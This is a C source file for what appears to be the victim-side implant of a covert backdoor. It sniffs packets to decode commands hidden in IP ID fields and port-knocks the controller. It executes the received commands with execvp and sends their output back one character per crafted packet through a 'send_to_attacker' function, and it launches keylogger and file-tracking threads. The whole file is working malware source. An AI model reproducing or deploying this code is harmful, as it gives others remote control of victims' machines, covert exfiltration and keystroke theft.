#include "victim.h"
#include "keylogger.h"
#include "filetracker.h"
#include "extern.h"


int main(int argc, char *argv[]) {
    struct options_victim opts;
    pthread_t keylogger_thread, cnc_thread, file_thread, select_thread;
    struct bpf_program fp;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    u_char* args = NULL;
    char* nic_interface;
    pcap_t* nic_fd;
    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    signal(SIGINT,sig_handler);
    program_setup();
    options_victim_init(&opts);
    create_socket(&opts, 'V', 'U', opts.dest_ip, ATC_UDP_PORT);
    create_socket(&opts, 'V', 'T', opts.dest_ip, ATC_TCP_PORT);
    create_socket(&opts, 'V', 'R', opts.my_ip, VIC_FILE_PORT);
    puts("============ Initialize VICTIM ============");
    fflush(stdout);



    if (pthread_create(&keylogger_thread, NULL, activate_keylogger, (void*)&opts) != 0) {
        perror("pthread_create error: keylogger_thread");
        exit(EXIT_FAILURE);
    }


    if (pthread_create(&file_thread, NULL, check_directory, (void*)&opts) != 0) {
        perror("pthread_create error: cnc_thread");
        exit(EXIT_FAILURE);
    }

    nic_interface = pcap_lookupdev(errbuf);    // get interface
    pcap_lookupnet(nic_interface, &netp, &maskp, errbuf);
    nic_fd = pcap_open_live(nic_interface, BUFSIZ, 1, -1, errbuf);
    args = (u_char*)&opts;
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    pcap_loop(nic_fd, PACKET_COUNT, pkt_callback, args);
    return EXIT_SUCCESS;
}


void options_victim_init(struct options_victim *opts) {
    memset(opts, 0, sizeof(struct options_victim));
}


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;

    /* ETHERNET - only handle IPv4 */
    ether = (struct ether_header*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(args, pkthdr, packet);
    }
}


void process_ipv4(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;
    struct iphdr *ip;
    struct options_victim* opts;
    char temp[2] = {0};
    uint16_t c;
    opts = (struct options_victim*)arg;

    ether = (struct ether_header*)(packet);
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));

    c = hide_data(ntohs(ip->id));
    if (opts->ip_flag == FALSE) {
        convert_uint32t_ip_to_str(ip->daddr, opts->my_ip, 'V');
        convert_uint32t_ip_to_str(ip->saddr, opts->dest_ip, 'A');
        opts->udpsa.sin_addr.s_addr = inet_addr(opts->dest_ip);
        opts->tcpsa.sin_addr.s_addr = inet_addr(opts->dest_ip);
        port_knock(opts->dest_ip, CLOSE_ATF);
        opts->ip_flag = TRUE;
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    temp[0] = (char)c;
    strcat(opts->received_buffer, temp);
    if (strstr(opts->received_buffer, "]]") != NULL) {
        extract_instruction(arg);
        memset(opts->received_buffer, 0, S_ARR_SIZE);
    }
}


void convert_uint32t_ip_to_str(uint32_t ip_addr, char* ip, char flag) {
    if (flag == 'V') {
        if (inet_ntop(AF_INET, &ip_addr, ip, INET_ADDRSTRLEN) == NULL) {
            perror("inet_ntop error");
            exit(EXIT_FAILURE);
        }
    }
    if (flag == 'A') {
        if (inet_ntop(AF_INET, &ip_addr, ip, INET_ADDRSTRLEN) == NULL) {
            perror("inet_ntop error");
            exit(EXIT_FAILURE);
        }
    }
}


void extract_instruction(u_char *args) {
    struct options_victim* ov;
    size_t length;
    char *start = NULL, *end = NULL;

    ov = (struct options_victim*)args;
    start = strstr(ov->received_buffer, "[["); // Find the first '[' character
    end = strstr(ov->received_buffer, "]]");   // Find the first ']' character
    if (start && end && start < end) {
        start += 2; // Move the pointer past the '[' character
        length = (size_t) (end - start);
        strncpy(ov->instruction, start, length); // Copy the content between '[' and ']'
        printf("Extracted content: %s\n", ov->instruction);
        execute_instruction(args);
    }
    else {
        printf("Invalid message format.\n");
    }
}


void execute_instruction(u_char *args) {
    struct options_victim* ov;
    char **commands;
    ov = (struct options_victim*)args;

    // TODO: PARSE ARGUMENT
    if (strcmp(ov->instruction, "keylogger") == 0) {
        ov->keylogger = TRUE;
    }
    else if (strstr(ov->instruction, "target") != NULL) {
        strcpy(ov->target_directory, ov->instruction + 7);
        ov->target = TRUE;
    }
    else {
        commands = split_line(ov->instruction);
        execute_command(commands, args);
        free(commands);
        send_to_attacker(args);
    }
    memset(ov->instruction, 0, S_ARR_SIZE);
}


char **split_line(char *line) {
    int bufsize = TOK_BUFSIZE, position = 0;
    char **tokens = malloc(bufsize * sizeof(char*));
    char *token;

    if (!tokens) {
        fprintf(stderr, "maalloc error: split_line()\n");
        exit(EXIT_FAILURE);
    }

    token = strtok(line, LSH_TOK_DELIM);
    while (token != NULL) {
        tokens[position] = token;
        position++;

        if (position >= bufsize) {
            bufsize += TOK_BUFSIZE;
            tokens = realloc(tokens, bufsize * sizeof(char*));
            if (!tokens) {
                fprintf(stderr, "realloc error: split_line()\n");
                exit(EXIT_FAILURE);
            }
        }

        token = strtok(NULL, LSH_TOK_DELIM);
    }
    tokens[position] = NULL;
    return tokens;
}


int execute_command(char **command_arr, u_char *args) {
    int i;

    if (command_arr[0] == NULL) {
        // An empty command was entered.
        return 1;
    }

    for (i = 0; i < num_builtins(); i++) {
        if (strcmp(command_arr[0], builtin_str[i]) == 0) {
            return (*builtin_func[i])(command_arr);
        }
    }

    return launch(command_arr, args);
}


int num_builtins(void) {
    return sizeof(builtin_str) / sizeof(char *);
}


int builtin_cd(char **command_arr) {
    if (command_arr[1] == NULL) {
        fprintf(stderr, "expected argument to \"cd\"\n");
    } else {
        if (chdir(command_arr[1]) != 0) {
            perror("builtin_cd()");
        }
    }
    return 1;
}


int builtin_exit(char **command_arr) {
    return 0;
}


int launch(char **command_arr, u_char *args) {
    char output[OUTPUT_SIZE] = {0};
    int bytes_read;
    struct options_victim* ov;
    int pipefd[2];

    ov = (struct options_victim*)args;

    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 0;
    }

    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        close(pipefd[0]); // Close the read end of the pipe

        // Redirect stdout to the write end of the pipe
        if (dup2(pipefd[1], STDOUT_FILENO) == -1) {
            perror("dup2");
            exit(EXIT_FAILURE);
        }
        close(pipefd[1]);

        if (execvp(command_arr[0], command_arr) == -1) {
            perror("execvp");
            exit(EXIT_FAILURE);
        }
    } else if (pid < 0) {
        perror("fork");
        return 0;
    } else {
        // Parent process
        close(pipefd[1]); // Close the write end of the pipe

        bytes_read = (int)read(pipefd[0], output, OUTPUT_SIZE);
        if (bytes_read == -1) {
            perror("read");
            return 0;
        }
        output[bytes_read] = '\0'; // Null-terminate the output
        strcpy(ov->sending_buffer, output);
        memset(output, 0, OUTPUT_SIZE);
        close(pipefd[0]); // Close the read end of the pipe
        // Wait for the child process to exit
        wait(NULL);
    }
    return 1;
}


void send_to_attacker(u_char *args) {
    struct options_victim* opts;
    struct iphdr ih;
    struct udphdr uh;
    uint16_t length;
    char s_buffer[UDP_SEND_SIZE] = {0};
    int byte;

    opts = (struct options_victim*)args;
    length = (uint16_t) strlen(opts->sending_buffer);

    for (int j = 0; j < length; j++) {
        create_udp_header(&uh, VIC_UDP_PORT, ATC_UDP_PORT);
        create_ip_header(&ih, opts, 'V', opts->sending_buffer[j], 'U');
        memcpy(s_buffer, &ih, sizeof(struct iphdr));
        memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
        byte = (int)sendto(opts->udp_socket, (const char *) s_buffer, UDP_SEND_SIZE, 0,
                      (const struct sockaddr *) &opts->udpsa, sizeof(opts->udpsa));
        if (byte < 0) {
            perror("send failed\n");
        }
        memset(s_buffer, 0, UDP_SEND_SIZE);
    }
    memset(opts->sending_buffer, 0, OUTPUT_SIZE);
}



void* activate_keylogger(void* arg){
    struct options_victim* ov;
    ov = (struct options_victim*)arg;
    while(1) {
        if (ov->keylogger == TRUE) {
            break;
        }
    }
    puts("KEYLOGGER ACTIVATED");
    keylogger_main(ov);
    return NULL;
}


void* check_directory(void* arg) {
    struct options_victim* ov;

    ov = (struct options_victim*) arg;
    while(1) {
        while(1) {
            if (ov->target == TRUE) {
                break;
            }
        }
        track_file(ov);
        ov->target = FALSE;
    }
}
